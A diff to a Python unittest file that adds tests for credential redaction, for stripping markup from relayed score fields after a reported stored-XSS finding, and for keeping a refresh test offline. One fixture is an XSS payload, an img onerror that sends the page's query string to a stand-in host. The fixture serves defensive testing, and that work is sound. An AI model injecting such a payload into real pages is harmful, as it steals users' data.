@@ -113,11 +113,43 @@ class Redaction(unittest.TestCase):
         self.assertNotIn("adm_root_42", tape)
         self.assertNotIn("bk_live", tape)
 
+    def test_a_credential_glued_to_other_text_is_still_redacted(self):
+        glued = {"why": "logged prefix_tk-ab12-cd34 and x9bk_live_9fA2xQ7z and _adm_root_42",
+                 "nested": {"prefix_tk-ab12-cd34": 1, "zbk_live_9fA2xQ7z": 2, "ok": "kept"}}
+        out = json.dumps(team_relay.scrub(glued)) + json.dumps(brain.scrub(glued))
+        for shape in ("tk-ab12-cd34", "bk_live_9fA2xQ7z", "adm_root_42"):
+            self.assertNotIn(shape, out)
+        self.assertIn("kept", out)
+        for plain in ("desk-broker.json", "task-force", "desk_market", "bk-1"):  # ordinary words stay readable
+            self.assertEqual(brain.scrub(plain), plain)
+
     def test_a_raw_bundle_is_scrubbed_again_by_the_brain(self):
         raw = {"kind": "team", "decisions": [{"tick": 1, "lane": "x", "why": "key bk_live_9fA2xQ7z leaked"}]}
         self.assertNotIn("bk_live", json.dumps(brain.valid_team(raw)))
         self.assertIsNone(brain.valid_desk({"name": "d", "mode": "live", "reason": {"x": 1}}))
         self.assertEqual(brain.valid_desk({"name": "d", "mode": "live", "reason": "bk_live_9fA2xQ7z"})["reason"], "[redacted]")
+
+
+class NoMarkupFromTheRelay(unittest.TestCase):
+    """Codex review of #43 (fb24d5f): relayed score fields reached innerHTML unescaped (stored XSS)."""
+    EVIL = '<img src=x onerror="fetch(\'//evil?\'+location.search)">'
+
+    def test_the_brain_keeps_only_finite_numbers_in_the_live_score_and_affinity(self):
+        raw = {"kind": "team", "score_state": {"prev": {"score": self.EVIL, "rank": 5, "cash": "60", "tick": 10,
+                                                        "set_LAV": 10, "set_<b>": 1, "note": "hi", "deals": float("nan")}},
+               "me": {**ME, "affinity": {"LAV": 1.6, "SAL": self.EVIL, "<i>": 1.0}}}
+        team = brain.valid_team(raw)
+        self.assertEqual(team["score_state"], {"prev": {"rank": 5, "tick": 10, "set_LAV": 10}})
+        self.assertEqual(team["me"]["affinity"], {"LAV": 1.6})
+        self.assertNotIn("onerror", json.dumps(team))
+
+    def test_the_page_escapes_every_relayed_field_it_renders(self):
+        import re
+        html = (ROOT / "tools" / "brain.html").read_text()
+        block = html[html.index("function renderUs("):html.index("function renderTruth(")]
+        self.assertIsNone(re.search(r"\$\{sc\.\w+ \?\?", block))       # every score field goes through esc()
+        for raw in ("${u.cash ??", "${u.copies}", "${c.n}", "${c.cash}", "${c.rebuilt}", "${pg.mult", "t${u.account_tick}"):
+            self.assertNotIn(raw, block)
 
 
 class RelayTransport(unittest.TestCase):
@@ -362,7 +394,16 @@ class OurAccount(unittest.TestCase):
             raise RuntimeError("stop after the plan call")
 
         team = {"score_state": {"prev": {"tick": 10 ** 6, "cash": 7}}}
-        with mock.patch.object(brain.market_plan, "plan", plan), mock.patch.object(brain, "load_team", lambda: team):
+        catalog = json.loads((ROOT / "logs" / "public" / "catalog.json").read_text())
+        public = {"schedule": {"upcoming": []}, "catalog": catalog}
+
+        def offline(*a, **k):
+            raise AssertionError("this test must not touch the network")
+
+        with mock.patch.object(brain.market_plan, "plan", plan), mock.patch.object(brain, "load_team", lambda: team), \
+                mock.patch.object(brain.vi, "catalog", lambda refresh=False: catalog), \
+                mock.patch.object(brain.vi, "public", lambda name, refresh=False: public[name]), \
+                mock.patch.object(urllib.request, "urlopen", offline):
             with self.assertRaisesRegex(RuntimeError, "stop after the plan call"):
                 brain.refresh()
         self.assertEqual((seen["reading"]["cash"], seen["reading"]["cash_source"]), (7, f"live score at t{10 ** 6}"))
